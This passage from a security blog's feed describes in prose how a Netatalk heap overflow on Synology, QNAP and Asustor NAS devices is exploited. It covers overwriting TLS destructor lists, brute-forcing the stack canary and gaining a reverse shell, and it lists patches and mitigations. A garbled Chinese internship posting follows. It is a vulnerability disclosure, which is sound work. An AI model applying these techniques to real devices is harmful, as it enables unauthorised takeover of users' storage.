&lt;p&gt;Because of this memory layout, we can use the vulnerability to overwrite the data on Thread Local Storage. What variables to be overwritten in the Thread Local Storage?&lt;/p&gt;

&lt;h4 id=&quot;thread-local-storage&quot;&gt;Thread-local Storage&lt;/h4&gt;
&lt;p&gt;Thread-local Storage (TLS) is used to store the local variables of the thread. Each thread have its own TLS, which allocated when the Thread is created. It will be released when thread is destroyed. We can use heap overflow vulnerabilities to overwrite most of the variables stored in TLS.&lt;/p&gt;

&lt;h4 id=&quot;target-in-tls&quot;&gt;Target in TLS&lt;/h4&gt;
&lt;p&gt;In fact, there are many variables that can control RIP on TLS. Here are a few more common ones.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;We can forge main_arena to achieve arbitrary writing, but itâ€™s more complicated&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pointer_guard&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;We can modify the pointer guard to change the function pointer, but it requires a leak.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;Itâ€™s more suitable for our current situation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;overwrite-tls_dtor_list&quot;&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;We can use the &lt;a href=&quot;https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;technique&lt;/a&gt; used by project zero in 2014 to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;, and then control the RIP in exit().&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dtor_func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;link_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; is a singly linked list of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; objects. It is mainly a destructor for thread local storage. In the end of the thread execution, it calls destructor function pointer in the linked list. We can overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; we forged.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When the process exits, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call_tls_dtors()&lt;/code&gt;. This function takes the object in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; and calls each destructor. At this time, if we can control &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;, it calls the function we specified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, in the new version of glibc, the function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; is protected by pointer guard. So we need to know the value of pointer guard before we overwrite it. The pointer guard is initialized at the beginning of the program and is an unpredictable random number. If we donâ€™t have information leakage, itâ€™s hard to know the value.&lt;/p&gt;

&lt;p&gt;But in fact pointer guard would also be placed in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;, there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; structure below the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;, which is the thread descriptor of main thread.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; structure is used to store various information about the thread such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack_guard&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pointer_guard&lt;/code&gt; used by the thread. In x86-64 Linux system, the fs register always points to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; of the current thread, so the program access thread local storage by using fs register. The memory layout of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread local storage&lt;/code&gt; is shown as below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use the vulnerability to overwrite not only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; but also pointer guard in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt;. In this way, we can overwrite it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; to solve the pointer guard problem mentioned earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But another problem appears, after we overwrite pointer guard, stack guard will also be overwritten.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before netatalk receives data, it first puts the original stack guard on the stack, and then invoke recv() to receive data to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;command&lt;/code&gt;. At this time, the buffer overflow occurs and cause stack guard and pointer guard to be overwritten. After this, netatalk returns to normal execution flow. It takes the stack guard from the stack and compare it with the stack guard in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;. However, it has been overwritten by us, the comparison here fails, causing abort to terminate the program.&lt;/p&gt;

&lt;h4 id=&quot;bypass-stack-guard&quot;&gt;Bypass stack guard&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the netatalk(afpd) architecture, each connection forks a new process to handle the userâ€™s request, so the memory address and stack guard of each connection are the same as the parent process. Because of this behavior, we can use brute-force bytes one by one to leak stack guard.&lt;/p&gt;

&lt;h4 id=&quot;brute-force-stack-guard&quot;&gt;Brute-force stack guard&lt;/h4&gt;

&lt;p&gt;We can use the overflow vulnerability to overwrite only the last byte of stack guard on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt; with different value in each different connection. Once the value is different from the original value, the service disconnects. Therefore, we can use the behavior to validate whether the value we overwritten is the same as stack guard. After the lowest byte is determined, we can continue to add another byte, and so on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the above figure, we assume that the stack guard is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeeffacebc00&lt;/code&gt;. Due to the stack guard feature in Linux, the lowest byte must be 0. Letâ€™s start with the second byte. We can overwrite with 0x00 to see if the connection is disconnected first. If it is disconnected, it means the value we overwrote is wrong. Next, we will test other values to see if the connection is disconnected. And so on, until there is no disconnection, we can find the correct value of section bytes. Then we can try to overwrite third byte, fourth byte and so on. After the stack guard is overwritten with 8 bytes and the connection is not disconnected, we can successfully bypass the stack guard.&lt;/p&gt;

&lt;p&gt;After we leak the stack guard, we can actually control RIP successfully. 
Next, we need to forge the structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; to control RIP.&lt;/p&gt;

&lt;h4 id=&quot;construct-the-_dtor_list-to-control-rip&quot;&gt;Construct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; to control RIP&lt;/h4&gt;

&lt;p&gt;In DSM 6.2.3-25426, Because it does not enable PIE, we can forge &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; on the data section of afpd.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luckily, when netatalk use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhx2 login&lt;/code&gt; authentication, it will copy the username we provided to the data section of afpd. We can use the feature to construct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; on the known address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After everything is constructed, we can trigger the normal function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSICloseSession&lt;/code&gt; to control the RIP.&lt;/p&gt;

&lt;h4 id=&quot;tls_dtor_list-in-synology&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; in Synology&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But in the glibc-2.20 in DSM 6.2.3-25426, it will invoke  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_get_addr&lt;/code&gt; to get the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;. The function will take the variable from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcb-&amp;gt;div&lt;/code&gt;. We also need to construct it on a known address.&lt;/p&gt;

&lt;p&gt;The final structure we forged is as follows&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, we control RIP to invoke execl() in afpd to get the reverse shell.&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/ocZkWuSCr4Y&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;h3 id=&quot;remark&quot;&gt;Remark&lt;/h3&gt;
&lt;p&gt;In general Netatalk, PIE protection is enabled by default. It is difficult to construct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; in a known address. In fact, you can also leak libc address using a similar method. It is still exploitable.&lt;/p&gt;

&lt;p&gt;This vulnerability not only affects Synology, but also affects some devices use Netatalk.&lt;/p&gt;

&lt;h3 id=&quot;other-vendor&quot;&gt;Other vendor&lt;/h3&gt;

&lt;p&gt;We tested several vendors using Netatalk and found that most device have similar problems, some are unexploitable but some are exploitable. We have tested QNAP and Asustor here, and both have successfully obtained the shell.&lt;/p&gt;

&lt;h4 id=&quot;qnap&quot;&gt;QNAP&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on TS451
    &lt;ul&gt;
      &lt;li&gt;QTS 4.5.4.1741&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Built-in system function&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/29.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20220328/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;asustor&quot;&gt;Asustor&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on AS5202T
    &lt;ul&gt;
      &lt;li&gt;ADM 3.5.7.RJR1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Built-in system function&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is worth mentioning that both QNAP and Asustor NAS does not enabled stack guard, and you can get the reverse shell without brute-force.&lt;/p&gt;

&lt;p&gt;When Synology has not yet patched this vulnerability, it can be exploited as long as the default is installed. &lt;strong&gt;No authentication is required&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Although QNAP and Asustor are not enabled by default, many users who use Macs still turn it on for convenience. Actually, Netatalk will be used almost in NAS. Most NAS will have an impact, as long as they enable Netatalk, an attacker can use this vulnerability to take over most of the NAS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Your NAS is not your NAS !&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, many people open Netatalk on the external network. There are 130,000 machines on shodan alone, most of which are Synology.&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;
&lt;p&gt;At present, the above three have been patched, please update to the latest version.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Synology
    &lt;ul&gt;
      &lt;li&gt;https://www.synology.com/zh-hk/security/advisory/Synology_SA_20_26&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;QNAP
    &lt;ul&gt;
      &lt;li&gt;https://www.qnap.com/en/security-advisory/qsa-21-50&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Asustor
    &lt;ul&gt;
      &lt;li&gt;https://www.asustor.com/service/release_notes#ADM%203.5.7.RKU2&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This vulnerability is also fixed in the recently released &lt;a href=&quot;https://netatalk.sourceforge.io/3.1/ReleaseNotes3.1.13.html&quot;&gt;Netatalk 3.1.13&lt;/a&gt;. If you use a version before Netatalk 3.1.13, you also need to update to the latest version.&lt;/p&gt;

&lt;h3 id=&quot;disable-afp&quot;&gt;Disable AFP&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Itâ€™s best to disable it directly. The project is rarely maintained, and the risk of continuing to use it is extremely high.&lt;/li&gt;
  &lt;li&gt;SMB is &lt;strong&gt;relatively safe&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;If you want to use similar feature, it is recommended to use SMB. It is relatively safe, but it can only be said to be relatively safe.&lt;/li&gt;
      &lt;li&gt;It is recommended that all related services should be opened in the intranet.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;We have successfully found a serious vulnerability in the NAS, and successfully wrote a proof-of-concept, which proved that it can be exploited on many NAS such as Synology, QNAP and Asustor.&lt;/p&gt;

&lt;p&gt;We also think that Netatalk is a new generation of backdoor in NAS!&lt;/p&gt;

&lt;p&gt;In the future, We hope that NAS vendor who use third-party can re-examine the security issues caused by them. It is strongly recommended that NAS vendor can review it by themselves and pay attention to whether other vendor have also fixed the vulnerabilities in the same third-party. It is possible that it will also be affected.&lt;/p&gt;

&lt;p&gt;The users who want to use NAS can also pay more attention to not opening the NAS on the external network and unused services should be disabled as much as possible to reduce the attack surface.&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h2&gt;
&lt;p&gt;In fact, we have not only found one vulnerability, we have also found that there are still many problems. In next part, we will publish more research after most vendor fix it.&lt;/p&gt;

&lt;p&gt;Please look forward to Part II.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS-en/</link>
                <guid>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS-en</guid>
                <pubDate>Mon, 28 Mar 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[å·²çµæŸ] DEVCORE 2022 å¯¦ç¿’ç”Ÿè¨ˆç•«</title>
                <description>&lt;p&gt;DEVCORE è‡ª 2012 æˆç«‹ä»¥ä¾†å·²é‚å‘ç¬¬åå¹´ï¼Œæˆ‘å€‘å¾ˆé‡è¦–å°ç£çš„è³‡å®‰ï¼Œä¹Ÿå°ˆæ³¨æ‰¾å‡ºæœ€åš´é‡çš„å¼±é»ä»¥ä¿è­·ä¸–ç•Œã€‚é›–ç„¶å…¬å¸è¦æ¨¡æ“´å¼µä¸å¿«ï¼Œä½†åœ¨æ¼¸æ¼¸ç«™ç©©è…³æ­¥çš„åŒæ™‚ï¼Œæˆ‘å€‘ä»ä¸å¿˜åˆè¡·ï¼šå¾ 2020 é–‹å§‹åœ¨è¼”å¤§ã€å°ç§‘å¤§æˆç«‹è³‡å®‰çå­¸é‡‘ï¼›åœ¨ 2021 å¹´æœ«æ“´å¤§&lt;a href=&quot;https://devco.re/company/jobs/&quot;&gt;å¾µæ‰&lt;/a&gt;ï¼Œæƒ³æ‰¾å°‹æœ‰è‘—ç›¸åŒç†å¿µçš„äººæ‰ä¸€èµ·å¥®é¬¥ï¼›è€Œç¾åœ¨ï¼Œæˆ‘å€‘é–‹å§‹å˜—è©¦èˆ‰è¾¦å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼Œå¸Œæœ›åŸ¹è‚²äººæ‰ã€å¢å¼·æ–°ä¸–ä»£çš„è³‡å®‰æŠ€èƒ½ï¼Œå¦‚æœæ‚¨å°é€™å€‹è¨ˆç•«æœ‰èˆˆè¶£ï¼Œæ­¡è¿ä¾†ä¿¡å ±åï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å¯¦ç¿’å…§å®¹&quot;&gt;å¯¦ç¿’å…§å®¹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡å¯¦ç¿’åˆ†ç‚º Binary åŠ Web å…©å€‹çµ„åˆ¥ï¼Œä¸»è¦å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
ä»¥ç ”ç©¶ç‚ºä¸»ï¼Œåœ¨èˆ‡å°å¸«ç¢ºå®šç ”ç©¶æ¨™çš„å¾Œï¼Œåˆ†æç›®æ¨™æ¶æ§‹ã€é€²è¡Œé€†å‘å·¥ç¨‹æˆ–ç¨‹å¼ç¢¼å¯©æŸ¥ã€‚è—‰ç”±é€™å€‹éç¨‹è¨“ç·´è‡ªå·±çš„æ€è·¯ï¼Œæ‰¾å‡ºå¯èƒ½çš„æ”»æ“Šé¢èˆ‡æ½›åœ¨çš„å¼±é»ã€‚å¦å¤–ä¹Ÿæœƒè®“å¤§å®¶å˜—è©¦å¯«éå¾€æ¼æ´çš„ Exploitï¼Œé«”é©—çœŸå¯¦ä¸–ç•Œçš„æ¼æ´éƒ½æ˜¯å¦‚ä½•åˆ©ç”¨ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´æŒ–æ˜åŠç ”ç©¶ 70 %&lt;/li&gt;
      &lt;li&gt;1-day é–‹ç™¼ (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
ä¸»è¦å…§å®¹ç‚ºåœ¨å°å¸«æŒ‡å¼•èˆ‡è¼”ä½ä¸‹ç ”ç©¶éå¾€æ¼æ´èˆ‡è¿‘å¹´å¸¸è¦‹æ–°å‹æ…‹æ¼æ´ã€æ”»æ“Šæ‰‹æ³•ï¼Œéœ€è¦è£½ä½œæŠ•å½±ç‰‡ä»‹ç´¹æˆæœä¸¦å»ºç½®å¯ä¾›ä»–äººé‡ç¾å¼±é»çš„æ¨¡æ“¬æ¸¬è©¦ç’°å¢ƒ (Lab)ï¼Œå¦å¯èƒ½éœ€è¦æ’°å¯«æˆ–ä¿®æ”¹å¯åˆ©ç”¨æ”»æ“Šç¨‹å¼é€²è¡Œå¼±é»é©—è­‰ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´åŠæ”»æ“Šæ‰‹æ³•ç ”ç©¶ 70%&lt;/li&gt;
      &lt;li&gt;å»ºç½® Lab 30%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å…¬å¸åœ°é»&quot;&gt;å…¬å¸åœ°é»&lt;/h3&gt;

&lt;p&gt;å°åŒ—å¸‚æ¾å±±å€å…«å¾·è·¯ä¸‰æ®µ 32 è™Ÿ 13 æ¨“&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ™‚é–“&quot;&gt;å¯¦ç¿’æ™‚é–“&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2022 å¹´ 4 æœˆé–‹å§‹åˆ° 7 æœˆåº•ï¼Œå…± 4 å€‹æœˆã€‚&lt;/li&gt;
  &lt;li&gt;æ¯é€±å·¥ä½œå…©å¤©ï¼Œå·¥ä½œæ™‚é–“ç‚º 10:00 â€“ 18:00
    &lt;ul&gt;
      &lt;li&gt;æ¯é€±å›ºå®šä¸€å¤©ä¸‹åˆ 14:00 - 18:00 å¿…é ˆåˆ°å…¬å¸è¨è«–é€²åº¦&lt;/li&gt;
      &lt;li&gt;å…¶é¤˜æ™‚é–“çš†ç‚ºé ç«¯ä½œæ¥­&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‹›å‹Ÿå°è±¡&quot;&gt;æ‹›å‹Ÿå°è±¡&lt;/h3&gt;

&lt;p&gt;å¤§å°ˆé™¢æ ¡å¤§ä¸‰ï¼ˆå«ï¼‰ä»¥ä¸Šå…·æœ‰ä¸€å®šç¨‹åº¦è³‡å®‰èƒŒæ™¯çš„å­¸ç”Ÿ&lt;/p&gt;

&lt;h3 id=&quot;é è¨ˆæ‹›æ”¶åé¡&quot;&gt;é è¨ˆæ‹›æ”¶åé¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary çµ„ï¼š2 äºº&lt;/li&gt;
  &lt;li&gt;Web çµ„ï¼š2~3 äºº&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;

&lt;p&gt;æ¯æœˆæ–°å°å¹£ 16,000 å…ƒ&lt;/p&gt;

&lt;h2 id=&quot;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&quot;&gt;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&lt;/h2&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ¢ä»¶è¦æ±‚&quot;&gt;å¯¦ç¿’æ¢ä»¶è¦æ±‚&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬é€†å‘å·¥ç¨‹åŠé™¤éŒ¯èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;èƒ½çœ‹æ‡‚çµ„åˆèªè¨€ä¸¦ç­è§£åŸºæœ¬ Debugger ä½¿ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬æ¼æ´åˆ©ç”¨èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;é ˆçŸ¥é“ ROPã€Heap Exploitation ç­‰ç›¸é—œåˆ©ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬ Scripting Language é–‹ç™¼èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;Pythonã€Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åˆ†æå¤§å‹ Open Source å°ˆæ¡ˆèƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;ä»¥ C/C++ ç‚ºä¸»&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åŸºç¤ä½œæ¥­ç³»çµ±çŸ¥è­˜
    &lt;ul&gt;
      &lt;li&gt;ä¾‹å¦‚çŸ¥é“ Virtual Address èˆ‡ Physical Address çš„æ¦‚å¿µ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;çŸ¥é“æ€æ¨£å¯«çš„ç¨‹å¼ç¢¼æœƒæœ‰å•é¡Œ
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;â€¦&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™ç ”ç©¶ç†±èª ï¼Œç¿’æ…£äº†è§£æŠ€è¡“æœ¬è³ª&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†éå¿…è¦æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;CTF æ¯”è³½ç¶“é©—&lt;/li&gt;
      &lt;li&gt;pwnable.tw æˆç¸¾&lt;/li&gt;
      &lt;li&gt;æœ‰å…¬é–‹çš„æŠ€è¡“ blog/slide æˆ– Write-ups&lt;/li&gt;
      &lt;li&gt;ç²¾é€š IDA Pro æˆ– Ghidra&lt;/li&gt;
      &lt;li&gt;æœ‰å¯«é 1-day åˆ©ç”¨ç¨‹å¼&lt;/li&gt;
      &lt;li&gt;å…·å‚™ä¸‹åˆ—ç¶“é©—
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ç†Ÿæ‚‰ OWASP Web Top 10ã€‚&lt;/li&gt;
  &lt;li&gt;ç†è§£ PortSwigger Web Security Academy ä¸­æ‰€æœ‰çš„å®‰å…¨è­°é¡Œæˆ–å·²å®Œæˆæ‰€æœ‰ Labã€‚
    &lt;ul&gt;
      &lt;li&gt;åƒè€ƒé€£çµï¼šhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
